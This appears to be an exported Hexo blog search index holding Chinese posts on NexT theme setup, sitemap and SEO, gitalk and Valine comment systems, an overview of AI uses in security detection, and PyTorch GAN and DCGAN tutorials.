&emsp;&emsp;最后修改主题目录中的_config.yml文件: themes/next/_config.xml1234567symbols_count_time: separated_meta: true # 是否另起一行（true的话不和发表时间等同一行） item_text_post: true # 首页文章统计数量前是否显示文字描述（本文字数、阅读时长） item_text_total: false # 页面底部统计数量前是否显示文字描述（站点总字数、站点阅读时长） awl: 4 # Average Word Length wpm: 275 # Words Per Minute（每分钟阅读词数） suffix: mins. &emsp;&emsp;上面是我的设置，没有要全站的统计，只保留了每篇文章的统计，可以根据自己的喜好来设置显示的类型。 数学公式&emsp;&emsp;首先在站点根目录下下载插件 1npm install hexo-math --save &emsp;&emsp;在站点配置文件 _config.yml 中添加： _config.yml123456math: engine: 'mathjax' # or 'katex' mathjax: # src: custom_mathjax_source config: # MathJax config &emsp;&emsp;最后在每个页面首部添加公式开启标志，这里采取更改hexo文件生成模板的方式来进行，以后再写博文就不必进行专门的设置了。修改scaffolds文件夹中的post.md文件，在头部区域中添加代码： scaffolds/post.md123456 title: &#123;&#123; title &#125;&#125; date: &#123;&#123; date &#125;&#125; tags: categories: copyright: true+ mathjax: true 流程图&emsp;&emsp;首先安装流程图模块 1npm install hexo-filter-mermaid-diagrams &emsp;&emsp;然后在博客根目录下的_config.yml文件中添加下面内容（已经进行过配置的可以跳过）： _config.yml1234mermaid: ## mermaid url https://github.com/knsv/mermaid enable: true # default true version: "7.1.2" # default v7.1.2 options: # find more api options from &emsp;&emsp;这时mermaid流程图就已经可以正常显示了，但是流程图靠右显示，因此我们还需要进行居中设置。 hexo-next主题在更新到7.7之后更改了用户自定义布局的方式，以前是更改_customs文件夹中的header.swig内容进行自定义，而7.7以后更改为在主题配置文件themes/next/_config.yml指定自定义链接链接文件，链接文件直接放在根目录下的某个文件夹内，做到不需要直接更改主题布局文件。 &emsp;&emsp;首先在网站根目录下创建source/_data/文件夹然后创建文件styles.styl,在文件中写入下面内容: 12345/*mermaid圖居中*/ 2 .mermaid&#123; 3 text-align: center; 4 max-height: 300px; 5 &#125; &emsp;&emsp;然后打开主题配置文件themes/next/_config.yml 123custom_file_path:- # style: source/_data/styles.styl+ style: source/_data/styles.styl &emsp;&emsp;流程图正常居中显示。]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客进行SEO优化，添加sitemap站点]]></title>
    <url>%2F2020%2F03%2F17%2Fhexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E8%A1%8CSEO%E4%BC%98%E5%8C%96%EF%BC%8C%E6%B7%BB%E5%8A%A0sitemap%E7%AB%99%E7%82%B9%2F</url>
    <content type="text"><![CDATA[&emsp;一篇关于如何对个人博客网站进行基本的SEO优化的文章,使你的博客可以在Google上被检索. Sitemap是什么​ &emsp;&emsp;Sitemap中文名称站点地图，他可以是任意形式的文档用来采用分级的形式描述了一个网站的架构，从而帮助访问者以及搜索引擎的机器人找到网站中的页面，使所有页面可被找到来增强搜索引擎优化的效果，因此添加站点地图对于优化SEO来说很重要。 图片 添加站点地图1. 安装hexo-generator-sitemap&emsp;&emsp;常规操作，在Git Bash中输入 12npm install hexo-generator-sitemap --save #适用于googlenpm install hexo-generator-baidu-sitemap --save #适用于baidu 2.设置内容 根目录下的_config.yml配置文件 &emsp;&emsp;在文件末尾中添加： 123## Sitemapsitemap: path: sitemap.xml &emsp;&emsp;修改文件中的url为博客地址： 生成sitemap.xml文件 &emsp;&emsp;使用hexo g生成命令就在yourwebsite.github.io\public中生成sitemap.xml然后将其中生成的文件移动到网站根目录下（因为我的public目录在浏览器无法访问，可以直接访问可以不做） 这里需要前面的hexo-generator-sitemap工具安装成功了才能生成 新建robots.txt文件 &emsp;&emsp;在网站根目录/source目录中新建一个robots.txt，该文件为是Robots协议的文件，用来告诉引擎哪些页面可以抓取，哪些不能。 1234567891011121314User-agent: *Allow: /Allow: /archives/Allow: /categories/Allow: /tags/Allow: /about/Disallow: /vendors/Disallow: /js/Disallow: /css/Disallow: /fonts/Disallow: /fancybox/Sitemap: https://anchorety.github.io/sitemap.xml 使用hexo d -g进行部署 3. Google Search Console设置 访问Google Search Console网址,使用google账号进行登录 添加博客域名 &emsp;&emsp;点击继续后会进入网站所有权验证,选择html标签验证。 &emsp;&emsp;在网站themes/next/layout/_partials/head.swig头部加入提示中的连接 &emsp;&emsp;验证成功后进入网站资源管理页面 添加站点地图 &emsp;&emsp;点击左侧导航栏中站点地图，然后输入前面sitemap.xml文件存放的地址(我的地址是网站根目录下，直接输入sitemap.xml即可)，提交后出现成功状态即可。 &emsp;&emsp;这里如果出现了404错误，可以在浏览器中直接输入输入的地址尝试是否能够访问，不能访问则将sitemap换到其他可以进行访问的地址再重复操作. 4.等待&emsp;&emsp;在进行完前面的环节后，控制台界面大部分时候都只能显示 &emsp;&emsp;只需要等待Google进行页面爬取就好了，一般等待一两天后就可以完全被Google收录了。可是使用google搜索下面内容进行收录查验： 1site: xxx.github.com &emsp;&emsp;完全被收录后： 图片]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客打造评论系统]]></title>
    <url>%2F2020%2F03%2F16%2Fhexo%E5%8D%9A%E5%AE%A2%E6%89%93%E9%80%A0%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本文主要讲述使用gitalk和Valine两种方式打造hexo博客评论系统的完整过程，并讲述两种评论系统的使用感受，本人使用它的主题为next，其他主题配置可能略有不同，如果在配置过程中产生任何问题，欢迎留言交流。 使用gitalk打造评论系统1. Github注册OAuth应用&emsp;&emsp;在GitHub上注册新应用，链接：https://github.com/settings/applications/new 参数说明： Application name： # 应用名称，随意 Homepage URL： # 网站URL Application description # 描述，随意 Authorization callback URL：# 网站URL &emsp;&emsp;点击注册后，页面跳转如下，其中Client ID和Client Secret在后面的配置中需要用到，到时复制粘贴即可： 2. 新建gitalk.swig&emsp;&emsp;新建themes/next/layout/_third-party/comments/gitalk.swig文件，并添加内容： :themes/next/layout/_third-party/comments/gitalk.swig1234567891011121314151617&#123;% if page.comments &amp;&amp; theme.gitalk.enable %&#125; &lt;link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"&gt; &lt;script src="https://unpkg.com/gitalk/dist/gitalk.min.js"&gt;&lt;/script&gt; &lt;script src="/js/src/md5.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; var gitalk = new Gitalk(&#123; clientID: '&#123;&#123; theme.gitalk.ClientID &#125;&#125;', clientSecret: '&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;', repo: '&#123;&#123; theme.gitalk.repo &#125;&#125;', owner: '&#123;&#123; theme.gitalk.githubID &#125;&#125;', admin: ['&#123;&#123; theme.gitalk.adminUser &#125;&#125;'], id: md5(location.pathname), # 使用md5确保id长度不超过50，关键 distractionFreeMode: '&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;' &#125;) gitalk.render('gitalk-container') &lt;/script&gt;&#123;% endif %&#125; &emsp;&emsp;为了配合其中的md5函数能够使用，这里要引入js脚本。将 md5.min.js 文件下载下来放到 themes/next/source/js/src/ 路径下。 3. 修改comments.swig&emsp;&emsp;修改themes/next/layout/_partials/comments.swig，添加内容如下，与前面的elseif同一级别上： 12&#123;% elseif theme.gitalk.enable %&#125; &lt;div id="gitalk-container"&gt;&lt;/div&gt; 4. 修改index.swig&emsp;&emsp;修改themes/next/layout/_third-party/comments/index.swig，在最后一行添加内容： 1&#123;% include 'gitalk.swig' %&#125; 5. 新建gitalk.styl&emsp;&emsp;新建/source/css/_common/components/third-party/gitalk.styl文件，添加内容： 1234.gt-header a, .gt-comments a, .gt-popup a border-bottom: none;.gt-container .gt-popup .gt-action.is--active:before top: 0.7em; 6. 修改third-party.styl&emsp;&emsp;修改themes/next/source/css/_common/components/third-party/third-party.styl，在最后一行上添加内容，引入样式： 1@import "gitalk"; 7. 修改_config.yml&emsp;&emsp;在主题配置文件themes/next/next/_config.yml中添加如下内容： themes/next/next/_config.yml12345678gitalk: enable: true githubID: github帐号 repo: 仓库名称 ClientID: Client ID ClientSecret: Client Secret adminUser: github帐号 #指定可初始化评论账户 distractionFreeMode: true 8.修改index.md文件使about、tag、categories页面不显示评论页面&emsp;&emsp;上面的操作步骤完成后，tag的页面显示如下,about和categories页面类似: ​ &emsp;&emsp;这里只需要在source/文件夹下分别新建 about、categories、tags 文件夹，每个文件夹里面都新建一个 index.md 文件（已有的直接添加comment: false），内容为 12345---title: # 标题type: "about" # about、categories、tagscomments: false--- &emsp;&emsp;就可以正常显示了 分类页面 最终呈现效果： 博主使用github账号登录后其他用户可以正常使用评论 部署 9.文章评论自动初始化&emsp;&emsp;到上面一步虽然评论系统已经可以使用，但是每篇文章都需要博主去手工进行初始化，非常的繁琐，因此在这里提供一个自动化进行评论初始化的脚本，可实现直接对全部脚本的初始化。 &emsp;&emsp;要使用该脚本首先要在github上穿件一种新的认证方式——Personal access token，点击Generate New token，如下填写 &emsp;&emsp;保存Token: &emsp;&emsp;安装依赖： 1sudo gem install faraday activesupport sitemap-parser &emsp;&emsp;在根目录下新建gitalk_inti.rb,内容如下： /gitalk.rb1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162username = "xxx" # GitHub 用户名token = "xxx" # GitHub Tokenrepo_name = "xxx.github.io" # 存放 issuessitemap_url = "https://anchorety.github.io/sitemap.xml" # sitemapkind = "gitalk" # "Gitalk" or "gitment"require 'open-uri'require 'faraday'require 'active_support'require 'active_support/core_ext'require 'sitemap-parser'require 'digest'puts "正在检索URL"sitemap = SitemapParser.new sitemap_urlurls = sitemap.to_aputs "检索到文章共#&#123;urls.count&#125;个"conn = Faraday.new(:url =&gt; "https://api.github.com") do |conn| conn.basic_auth(username, token) conn.headers['Accept'] = "application/vnd.github.symmetra-preview+json" conn.adapter Faraday.default_adapterendcommenteds = Array.new` if [ ! -f .commenteds ]; then touch .commenteds fi`File.open(".commenteds", "r") do |file| file.each_line do |line| commenteds.push line endendurls.each_with_index do |url, index| url.gsub!(/index.html$/, "") if commenteds.include?("#&#123;url&#125;\n") == false url_key = Digest::MD5.hexdigest(URI.parse(url).path) response = conn.get "/search/issues?q=label:#&#123;url_key&#125;+state:open+repo:#&#123;username&#125;/#&#123;repo_name&#125;" if JSON.parse(response.body)['total_count'] &gt; 0 `echo #&#123;url&#125; &gt;&gt; .commenteds` else puts "正在创建: #&#123;url&#125;" title = open(url).read.scan(/&lt;title&gt;(.*?)&lt;\/title&gt;/).first.first.force_encoding('UTF-8') response = conn.post("/repos/#&#123;username&#125;/#&#123;repo_name&#125;/issues") do |req| req.body = &#123; body: url, labels: [kind, url_key], title: title &#125;.to_json end if JSON.parse(response.body)['number'] &gt; 0 `echo #&#123;url&#125; &gt;&gt; .commenteds` puts "\t↳ 已创建成功" else puts "\t↳ #&#123;response.body&#125;" end end endend &emsp;&emsp;最后可直接输入： 1ruby gitalk_init.rb 网上大量自动初始化脚本多次提交会出现多次创建issue问题，该脚本不存在多提交多次创建issue的问题，可以放心使用。 使用Valine打造评论系统&emsp;&emsp;Valine 是基于 LeanCloud 作为数据存储的，是一款商用的软件，与gitalk相比具有以下优势： 稳定性更好 不存在初始化问题 自带了文章阅读量显示功能 具备更加方便的邮箱提醒功能 下面将对使用Valine打造评论系统的详细过程进行介绍： 1.账号注册&emsp;&emsp;因为是商用软件，因此使用Valine首先要进行的就是登陆LeanCloud网站进行账号注册。 因为网络安全法的出台，现在LeanCloud账号注册必选要进行实名认证后才能正常使用 2.创建应用&emsp;&emsp;点击创建应用，输入应用名称，选择开发版进行创建。 &emsp;&emsp;创建成功后，出现界面 3. 打开应用存储，创建存储表&emsp;&emsp;打开应用，选择左边的存储，进入后点击创建Class，分别创建Counter和Comment两个Class，创建时全向都选择无任何限制，面向全部用户。 Counter为文章阅读计数存储表，Comment为评论存储表。 &emsp;&emsp;创建成功后如下： 4.关闭其他服务，设置Web安全域名&emsp;&emsp;点击左侧导航栏设置选项，点击安全中心，关闭除数据存储外其他选型，然后在Web安全域名中填写博客地址。 5.点击应用key，获取应用的AppID、AppKey 6.修改主题配置文件进行配置&emsp;&emsp;打开主题目录下_config.yml文件搜索valine对其进行配置。 themes/next/_config.yml12345678valine: enable: true appid: xxx #上面保存的APPID appkey: xxx #上面保存的AppKey visitor: true #阅读统计 guest_info: nick,mail #评论用户信息设置- language: zh-CN+ language: zh-cn 这里language只能是小写，大写会造成评论区域不显示 &emsp;&emsp;博客重新部署后，就可以正常使用Valine评论了。 参考文献 https://yuanmomo.net/2019/06/20/hexo-add-valine/]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo博客高阶设置]]></title>
    <url>%2F2020%2F03%2F16%2Fhexo%E5%8D%9A%E5%AE%A2%E9%AB%98%E9%98%B6%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本文主要讲述Hexo博客的目录结构和首页文章展现形式、热文推荐等博客的一些高级用法，提供给对博客有进一步了解需求和向进一步增加博客功能的朋友们。 Hexo博客目录结构&emsp;&emsp;Hexo目录博客如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253hexo-install-directory├── CNAME├── _config.yml //Hexo的配置文件，可以配置主题、语言等├── avatar.jpg├── db.json├── debug.log├── node_modules│ ├── hexo│ ├── hexo-deployer-git│ ├── hexo-generator-archive│ ├── hexo-generator-category│ ├── hexo-generator-feed│ ├── hexo-generator-index│ ├── hexo-generator-sitemap│ ├── hexo-generator-tag│ ├── hexo-migrator-wordpress│ ├── hexo-renderer-ejs│ ├── hexo-renderer-marked│ ├── hexo-renderer-stylus│ └── hexo-server├── package.json├── public //执行hexo g命令后，生成的内容会在这里，包括所有的文章、页面、分类、tag等.│ ├── 2013│ ├── 2014│ ├── 2015│ ├── 2016│ ├── 404.html│ ├── Staticfile│ ├── archives│ ├── atom.xml│ ├── categories│ ├── css│ ├── images│ ├── index.html│ ├── js│ ├── page│ ├── sitemap.xml│ └── vendors├── scaffolds //保存着默认模板，自定义模板就是修改该目录下的文件│ ├── draft.md //默认的草稿模板│ ├── page.md //默认的页面模板│ └── post.md //默认的文章模板├── source //Hexo存放编辑页面的地方，可以使用vim或其他编辑器编辑这里的内容│ ├── 404.html //自定义404页面，可以使用腾讯公益404页面│ ├── Staticfile │ ├── _drafts //存放所有的草稿文件的目录│ ├── _posts //存放所有的文章文件的目录，用的最多，比如执行hexo n "post_name"之后，post_name这篇文章就存放在这个目录下│ ├── categories│ └── images //这是我自己定义的，用于存放个人的avatar└── themes //Hexo的所有主题 ├── landscape ├── next //这是我目前用的主题 └── yilia 博客高级设置1. 设置首页文章列表不显示全文(只显示预览)&emsp;&emsp;编辑进入hexo博客项目的themes/next/_config.yml文件,搜索”auto_excerpt“,找到如下部分： 12345# Automatically Excerpt. Not recommand.# Please use &lt;!-- more --&gt; in the post to control excerpt accurately. auto_excerpt: enable: false length: 150 ​ 将enable修改为true，length设置为150，然后hexo d -g重新进行网站部署。 用户可以在文章中通过 &lt;!-- more --&gt; 标记来精确划分摘要信息，标记之前的段落将作为摘要显示在首页。 2.增加文章热度统计3.网址英文显示参考文献 http://yearito.cn/posts/hexo-advanced-settings.html https://blog.xinspace.xin/2016/04/11/自定义Hexo博客的文章、草稿和页面的模板/ https://www.cnblogs.com/zhansu/p/9643066.html]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对AI安全技术实际应用的一些看法]]></title>
    <url>%2F2020%2F02%2F21%2F%E5%AF%B9AI%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9C%8B%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本文主要是根据目前本人了解，AI技术在安全领域中的一些可能应用点做一些总结，目前本人刚刚毕业，希望在AI安全上也能贡献出自己的一份力量，再过两年来回顾这篇文章不知道会有什么新的看法。 1.入侵检测​ 这里比较火的主要有几个小类： Webshell检测 AI与Webshell检测的结合是许多公司在AI+入侵检测领域一般最先想要去进行研究的部分，因为Webshell危险等级很高，并且使用传统的方式只能够防御一些已有的Webshell攻击，而对新发生的Webshell攻击很难直接使用已有的规则方式进行预防，因此只能将希望寄托在AI上，这里也是我重点在研究的方向，目前针对该问题主要存在的一些解决方案如下： 完全使用深度学习的方式进行检测 使用先验知识进行特征提取然后使用机器学习建模进行检测 参数异常检测 ​ 参数异常检测目前主流的方式是使用HMM进行检测，在实际使用过程检测的效果还是非常不错·，模型能够有效的发现未知的攻击，但是唯一存在的问题就是模型运行效率问题，由于该模型对每一个要访问的页面都要构建一个模型，由于模型量巨大因此很难应用在大范围的主干网络对不同的站点进行检测，单对于公司内部网页站点数比较少的情况还是非常值得进行尝试的。 2.垃圾邮件识别​ 垃圾邮件识别应该是最早使用AI去进行解决的安全问题，也是目前取得的效果最好，在实际环境中更多别采用的一种。垃圾邮件的识别从本质上来说就是一些半结构化的数据从文本的角度金慈宁 3.DGA域名检测​ 对于DGA域名的检测，各个公司研究的也算比较多的 ​ 在几年以前DGA域名的识别在机器学习开始兴起后逐渐流行起了使用先验知识进行最长连续字母长度、最长连续数字长度等域名随机读衡量的统计特征人工提取，然后再使用各种各样的机器学习进行建模的过程，虽然在各种paper中效果良好，但是在我的实际使用过程中效果差强人意。而近年来人们渐渐意识到，由于DGA域名的展现形式与正常流量展现形式的差异表现很难直接使用人工的方式进行描述，因此将主要精力放在了使用深度学习技术进行DGA域名检测研究中来，通过大量的实验研究也证明了深度学习技术更加适合解决该问题。 4.僵尸网络检测​ 使用AI技术进行僵尸网络的检测目前也是一个非常热的问题，但大多处于发papar灌水阶段，目前没有通说有公司使用。本人研究的不多，这里不做展开。 未来的展望​ 1.对于Webshell检测的研究目前大多只停留在使用单条流量进行Webshell进行检测上，但实际环境中要想真正使用AI技术进行Webshell检测并直接进行响应，还用使用多条流量，]]></content>
      <tags>
        <tag>AI安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对抗样本生成——DCGAN]]></title>
    <url>%2F2020%2F02%2F13%2F%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94DCGAN%2F</url>
    <content type="text"><![CDATA[​ 本文为对抗样本生成系列文章的第三篇文章，主要对DCGAN的原理进行介绍，并对其中关键部分的使用pytorch代码进行介绍，另外如果有需要完整代码的同学可以关注我的github。 该系列包含的文章还包括： 对抗样本生成—VAE 对抗样本生成—GAN) 对抗样本生成—DCGAN) 对抗样本生成—文本生成 ​ DCGAN时CNN与GAN相结合的一种实现方式，源自于论文《Unsupervised Representation Learning with Deep Convolutional Generative Adversarial Networks》，该模型主要讨论了如何将CNN引入GAN网络，将CNN引入GAN网络并非直接将Generator和Discriminator的全连接网络直接替换成CNN即可，而是要对CNN网络进行特定的设计才能使CNN网络有效的快速收敛。本文将对DCGAN中一些核心观点进行详细论述并对其中核心部分的代码实现进行解析，完整的代码实现可以关注我的github. ​ DCGAN中一些核心关键点如下： 1.激活函数： ​ 生成器除最后一层的输出使用Tanh激活函数外统一使用relu作为激活函数， ​ 判别器所有层都是用LeakyRelu激活函数(这里很关键，还是使用relu的话很可能造成模型很难进行有优化，最终模型输出的图像一致和目标图像相差很远) 2.生成器和判别器的模型结构复杂度不要差距太大 ​ 复杂度差距过大会导致模型训练后期一个部分的效果非常好，能够不断提升，但是另一个部分的由于模型过于简单无法再优化导致该部分效果不断变差。 3.判别器最后的全连接层使用卷积层代替。 ​ 全部的操作均使用卷积操作进行。 4.Batch Normalization区别应用： ​ 不能将BN层应用到生成网络和判别网络的全部部分，在生成网络的输出层和判别网络的输入层不能使用BN层，否则可能造成模型的不稳定。 原始对抗训练细节实现 预处理：将输入图像的各个像素点标准化到tanh的值域范围[-1,1]之内 权重初始化:均值为0方差为0.02的正态分布 Relu激活函数斜率：0.2 优化器：Adam 0.01或0.0002 Generator​ 生成器主要反卷积层、BN层、激活函数层三部分堆叠而成，其结构如下所示： 在DCGAN中一个最为核心的结构就是反卷积层，那么什么是反卷积层呢？ ​ 反卷积是图像领域中常见的一种上采样操作，反卷积并不是正常卷积的逆过程，而是一种特殊的正向卷积，先按照一定的比例通过补 0来扩大输入图像的尺寸，接着旋转卷积核，再进行正向卷积，这种特殊的卷积操作只能能够复原矩阵的原始尺寸，不能对原矩阵的各个元素的内容进行复原。 生成器实现中核心点包括： 1.使用反卷积进行一步一步的图片生成 2.最后的输出层中不使用BN 3.除输出层使用tanh激活函数外，其它层都使用relu激活函数 ​ 代码实现如下(该代码为手写数字图片生成项目中的实现，真实维度为28*28)： 1234567891011121314151617181920212223242526272829class Generator(nn.Module): def __init__(self): super(Generator,self).__init__() self.layer1 = nn.Sequential( nn.ConvTranspose2d(latent_size,128,4,1,0,bias=False), #使用反卷积进行还原(b,512,4,4) nn.BatchNorm2d(128), nn.ReLU(True) #生成器中除输出层外均使用relu激活函数 ) self.layer2 = nn.Sequential( nn.ConvTranspose2d(128,64,4,2,1,bias=False), ##使用反卷积进行还原(b,64,8,8) nn.BatchNorm2d(64), nn.ReLU(True), #生成器中除输出层外均使用relu激活函数 ) self.layer3 = nn.Sequential( nn.ConvTranspose2d(64,32,4,2,1,bias=False), ##使用反卷积进行还原(b,8,16,16) nn.BatchNorm2d(32), nn.ReLU(True) #生成器中除输出层外均使用relu激活函数 ) # 生成器的输出层不使用BN self.layer4 = nn.Sequential( nn.ConvTranspose2d(32,1,4,2,3,bias=False), ##使用反卷积进行还原(b,1,28,28) nn.Tanh(), ) def forward(self,input_data): x = self.layer1(input_data) x = self.layer2(x) x = self.layer3(x) x = self.layer4(x) return x Discriminator​ 判别器主要为实现对图片是否为生成图片。在DCGAN中主要使用CNN、BN和LeakyRelu网络来进行，其实现的核心点包括： 1.判别网络全部使用卷积操作来搭建，整个过程中不包含全连接层和池化层。 2.判别器激活函数除最后一层使用Sigmod激活函数外，全部使用LeakyRelu激活函数 3.判别器的输入层中不能使用BN层 12345678910111213141516171819202122232425262728class Discriminator(nn.Module): def __init__(self): super(Discriminator, self).__init__() self.cnn1 = nn.Sequential( nn.Conv2d(1,16,4,2,3), #(b,13,16,16) nn.LeakyReLU(0.2,True) ) self.cnn2 = nn.Sequential( nn.Conv2d(16,32,4,2,1), #(b,32,8,8) nn.BatchNorm2d(32), nn.LeakyReLU(0.2,True), ) self.cnn3 = nn.Sequential( nn.Conv2d(32,64,4,2,1), #(b,64,4,4) nn.BatchNorm2d(64), nn.LeakyReLU(0.2,True) ) self.cnn4 = nn.Sequential( nn.Conv2d(64,1,4,2,0), #(b,1,1,1) nn.Sigmoid() ) def forward(self,input_data): x = self.cnn1(input_data) x = self.cnn2(x) x = self.cnn3(x) x = self.cnn4(x) return x 参考文献： DCGAN pytorch教程：https://pytorch.org/tutorials/beginner/dcgan_faces_tutorial.html]]></content>
      <tags>
        <tag>对抗样本生成</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对抗样本生成——GAN]]></title>
    <url>%2F2020%2F02%2F13%2F%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94GAN%2F</url>
    <content type="text"><![CDATA[​ 本文为对抗样本生成系列文章的第二篇文章，主要对GAN的原理进行介绍，并对其中关键部分的使用pytorch代码进行介绍，另外如果有需要完整代码的同学可以关注我的github。 该系列包含的文章还包括： 对抗样本生成—VAE 对抗样本生成—GAN) 对抗样本生成—DCGAN) 对抗样本生成—文本生成 GAN(Generative Adversarial Network)​ GAN中文名称生成对抗网络，是一种利用模型对抗技术来生成指定类型样本的技术，与VAE一起是目前主要的两种文本生成技术之一。GAN主要包含generater(生成器)和discriminator(判别器)两部分，generator负责生成假的样本来骗过discriminator，discriminator负责对样本进行打分，判断是否为生成网络生成的样本。 Generator 输入：noise sample（一个随机生成的指定纬度向量） 输出：目标样本（fake image等） ​ Generator在GAN中负责接收随机的噪声输入，进行目标文本、图像的生成,其目标就是尽可能的生成更加真实的图片、文字去欺骗discriminator。具体的实现可以使用任何在其他领域证明有效的神经网络，本文使用最简单的全连接网络作为Generator进行实验。 12345678### 生成器结构G = nn.Sequential( nn.Linear(latent_size, hidden_size), nn.ReLU(), nn.Linear(hidden_size, hidden_size), nn.ReLU(), nn.Linear(hidden_size, image_size), nn.Tanh()) Discriminator 输入：样本（包含生成的样本和真实样本两部分） 输出：score（一个是否为真实样本的分数，分数越高是真实样本的置信的越高，越低越可能时生成样本） ​ Discriminator在GAN网络中负责将对输入的图像、文本进行判别，对其进行打分，打分越高越接近真实的图片，打分越低越可能是Generator生成的图像、文本，其目标是尽可能准确的对真实样本与生成样本进行准确的区分。与Generator一样Discriminator也可以使用任何网络实现，下面是pytorch中最简单的一种实现。 12345678### 判别器结构D = nn.Sequential( nn.Linear(image_size, hidden_size), # 判别的输入时图像数据 nn.LeakyReLU(0.2), nn.Linear(hidden_size, hidden_size), nn.LeakyReLU(0.2), nn.Linear(hidden_size, 1), nn.Sigmoid()) Model train​ GAN中由于两部分需要进行对抗，因此两部分并不是与一般神经网络一样整个网络同时进行跟新训练的，而是两部分分别进行训练。训练的基本思路如下所示： Epoch: 1. 生成器使用初始化的参数随机输入向量生成图片。 2. 生成器进行判别，使用判别器结果对判器参数进行更新。 3. 固定判别器参数，对生成器使用更新好的判别器进行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546for epoch in range(num_epochs): for i, (images, _) in enumerate(data_loader): images = images.reshape(batch_size, -1) # 创建标签，随后会用于损失函数BCE loss的计算 real_labels = torch.ones(batch_size, 1) # true_label设为1，表示True fake_labels = torch.zeros(batch_size, 1) # fake_label设为0，表示False # ================================================================== # # 训练判别模型 # ================================================================== # # 计算真实样本的损失 outputs = D(images) d_loss_real = criterion(outputs, real_labels) real_score = outputs # 计算生成样本的损失 # 生成模型根据随机输入生成fake_images z = torch.randn(batch_size, latent_size) fake_images = G(z) outputs = D(fake_images) d_loss_fake = criterion(outputs, fake_labels) fake_score = outputs # 计算判别网络部分的总损失 d_loss = d_loss_real + d_loss_fake # 对判别模型损失进行反向传播和参数优化 d_optimizer.zero_grad() g_optimizer.zero_grad() d_loss.backward() d_optimizer.step() # ================================================================== # # 训练生成模型 # ================================================================== # # 生成模型根据随机输入生成fake_images,然后判别模型进行判别 z = torch.randn(batch_size, latent_size) fake_images = G(z) outputs = D(fake_images) # 大致含义就是在训练初期，生成模型G还很菜，判别模型会拒绝高置信度的样本，因为这些样本与训练数据不同。 # 这样log(1-D(G(z)))就近乎饱和，梯度计算得到的值很小，不利于反向传播和训练。 # 换一种思路，通过计算最大化log(D(G(z))，就能够在训练初期提供较大的梯度值，利于快速收敛 g_loss = criterion(outputs, real_labels) # 反向传播和优化 reset_grad() g_loss.backward() g_optimizer.step() ​ 从上面的实现过程我们可以发现一个问题：在进行判别模型训练损失函数的计算由两部分组成，而生成模型进行训练时只由一部分组成，并且该部分的交叉熵还是一种反常的使用方式，这是为什么呢？ 损失函数​ 整体的损失函数表现形式： ​ \min\limits_{G}\max\limits_{D}E_{x\in\ P_{data}}\ [logD(x)]+E_{x\in\ P_{G}}\ [log(1-G(D(x)))] Generator Loss​ 对于判别器进行训练时，其目标为： ​ \max\limits_{D}E_{x\in\ P_{data}}\ [logD(x)]+E_{x\in\ P_{G}}\ [log(G(1-D(x)))] ​ 而对比交叉熵损失函数的计算公式： ​ L = -[ylogp+(1-y)log(i-p)] ​ 二者其实在表现形式形式上是完全一致的，这是因为判别器就是区分样本是否为真实的样本，是一个简单的0/1分类问题，所以形式与交叉熵一致。在另一个角度我们可以观察，当输入样本为真实的样本时，$E_{x\in\ P_{G}}\ [log(1-G(D(x)))]$为0，只剩下$E_{x\in\ P_{data}}\ [logD(x)]$，为了使其最大只能优化网络时D(x)尽可能大，即真实样本判别器给出的得分更高。当输入为生成样本时，$E_{x\in\ P_{data}}\ [logD(x)]$为0，只剩下$E_{x\in\ P_{G}}\ [log(1-G(D(x)))]$，为使其最大只能使D(x)尽可能小，即使生成样本判别器给出的分数尽可能低，使用交叉熵损失函数正好与目标相符。 ​ 因此，判别器训练相关的代码如下，其中可以看到损失函数直接使用了二进制交叉熵进行。 123456789101112131415161718192021criterion = nn.BCELoss()d_optimizer = torch.optim.Adam(D.parameters(), lr=0.0002)# 真实样本的损失outputs = D(images)d_loss_real = criterion(outputs, real_labels)real_score = outputs# 生成样本的损失z = torch.randn(batch_size, latent_size) # 生成模型根据随机输入生成fake_imagesfake_images = G(z) outputs = D(fake_images)d_loss_fake = criterion(outputs, fake_labels)fake_score = outputs# 计算判别网络部分的总损失d_loss = d_loss_real + d_loss_fake# 对判别模型损失进行反向传播和参数优化d_optimizer.zero_grad()g_optimizer.zero_grad()d_loss.backward()d_optimizer.step() Discriminator Loss​ 对于生成器其训练的目标为： ​ \min\limits_{G}\max\limits_{D}E_{x\in\ P_{data}}\ [logD(x)]+E_{x\in\ P_{G}}\ [log(1-G(D(x)))]（其中D固定） ​ 对于生成器，在D固定的情况下，$E_{x\in\ P_{data}}\ [logD(x)]$为固定值，因此可以不做考虑，表达式转为： ​ \min\limits_{G}\max\limits_{D}E_{x\in\ P_{G}}\ [log(1-G(D(x)))]（其中D固定） ​ 使用该表达式作为目标函数进行参数更新存在的问题就是在训练的起始阶段，由于开始时生成样本的质量很低，因此判别器很容易给一个很低的分数，即D(x)非常小，而log(1-x)的函数在值接近0时斜率也很小，因此使用该函数作为损失函数在开始时很难进行参数更新。 ​ 